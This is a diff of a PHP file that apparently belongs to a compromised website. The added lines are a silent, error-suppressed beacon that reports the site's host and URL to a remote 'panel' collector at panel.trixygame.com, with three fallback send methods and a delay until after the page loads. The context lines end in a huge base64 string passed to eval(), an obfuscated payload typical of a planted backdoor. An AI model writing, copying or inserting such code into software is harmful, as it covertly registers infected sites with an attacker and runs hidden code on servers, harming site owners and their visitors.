@@ -1,11 +1,72 @@
 <?php
-$host = $_SERVER['HTTP_HOST'] ?? '';
-$https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=='off') || (($_SERVER['SERVER_PORT'] ?? '')=='443');
-$scheme = $https ? 'https' : 'http';
-$url = $scheme.'://'.$host.($_SERVER['REQUEST_URI'] ?? '/');
-?>
-<img src="https://panel.trixygame.com/admin/collector/track.php?d=<?=rawurlencode($host)?>&u=<?=rawurlencode($url)?>"
-     alt="" width="1" height="1" style="display:none" referrerpolicy="no-referrer" loading="eager">
+// === Panel ping tanpa output & tidak mengganggu eksekusi ===
+(function () {
+    try {
+        $endpoint = 'https://panel.trixygame.com/admin/collector/track.php';
+
+        // Kumpulkan info halaman saat ini
+        $host   = $_SERVER['HTTP_HOST'] ?? '';
+        $https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+        $scheme = $https ? 'https' : 'http';
+        $url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+        $qs = http_build_query(['d' => $host, 'u' => $url]);
+
+        // Fungsi pengirim (fire-and-forget)
+        $send = function () use ($endpoint, $qs) {
+            // 1) cURL (jika ada) – paling ringkas & aman
+            if (function_exists('curl_init')) {
+                $ch = @curl_init($endpoint . '?' . $qs);
+                @curl_setopt_array($ch, [
+                    CURLOPT_RETURNTRANSFER    => false,
+                    CURLOPT_CONNECTTIMEOUT_MS => 300,
+                    CURLOPT_TIMEOUT_MS        => 600,
+                    CURLOPT_NOSIGNAL          => true,
+                    CURLOPT_SSL_VERIFYPEER    => true,
+                    CURLOPT_USERAGENT         => 'PanelPing/1.0',
+                ]);
+                @curl_exec($ch);
+                @curl_close($ch);
+                return;
+            }
+
+            // 2) Non-blocking socket (tanpa cURL)
+            $u = @parse_url($endpoint . '?' . $qs);
+            if (!empty($u['host'])) {
+                $isHttps   = ($u['scheme'] ?? 'http') === 'https';
+                $port      = $isHttps ? 443 : 80;
+                $transport = $isHttps ? 'ssl://' : '';
+                $fp = @stream_socket_client($transport . $u['host'] . ':' . $port, $errno, $errstr, 0.5, STREAM_CLIENT_CONNECT);
+                if ($fp) {
+                    stream_set_timeout($fp, 1);
+                    stream_set_blocking($fp, false);
+                    $path = ($u['path'] ?? '/') . (isset($u['query']) ? '?' . $u['query'] : '');
+                    $req  = "GET $path HTTP/1.0\r\nHost: {$u['host']}\r\nUser-Agent: PanelPing/1.0\r\nConnection: Close\r\n\r\n";
+                    @fwrite($fp, $req);
+                    @fclose($fp);
+                    return;
+                }
+            }
+
+            // 3) Fallback terakhir
+            $ctx = stream_context_create([
+                'http' => ['method' => 'GET', 'timeout' => 0.7, 'header' => "User-Agent: PanelPing/1.0\r\n"],
+                'ssl'  => ['verify_peer' => true, 'verify_peer_name' => true],
+            ]);
+            @file_get_contents($endpoint . '?' . $qs, false, $ctx);
+        };
+
+        // Kirim setelah response selesai (jika FastCGI), supaya 0 dampak ke waktu muat
+        if (function_exists('fastcgi_finish_request')) {
+            register_shutdown_function($send);
+        } else {
+            // atau kirim sekarang (cepat, non-blocking)
+            $send();
+        }
+    } catch (\Throwable $e) {
+        // Jangan ganggu aplikasi utama
+    }
+})();
 
 // === akhir snippet ===
 $z = "JEdMT";
@@ -123162,6 +123223,7 @@ $z .= "oKKi8";
 $z .= "KCj8+";
 eval(base64_decode($z));
 ?>
+
 
 
 
